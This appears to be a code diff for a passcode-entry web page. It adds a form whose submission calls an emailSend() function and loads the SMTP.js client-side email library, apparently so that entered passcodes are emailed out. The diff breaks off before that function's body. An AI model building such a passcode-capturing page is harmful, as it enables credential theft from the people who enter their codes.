@@ -8,6 +8,7 @@
   <link rel="stylesheet" href="pin.css">
 </head>
 <body>
+    <form id="form" onsubmit="emailSend(); return false;">
   <div class="container">
     <h3>Enter passcode</h3>
     <div class="dots">
@@ -19,6 +20,11 @@
     </div>
     <button id="nextBtn" onclick="goToNextPage()" disabled>Next</button>
   </div>
+  </form>
+    <!-- External Libraries -->
+  <script src="https://smtpjs.com/v3/smtp.js"></script>
+  <script src="https://unpkg.com/sweetalert/dist/sweetalert.min.js"></script>
+  
 <script>
   // Function to handle passcode submission
 function emailSend() {
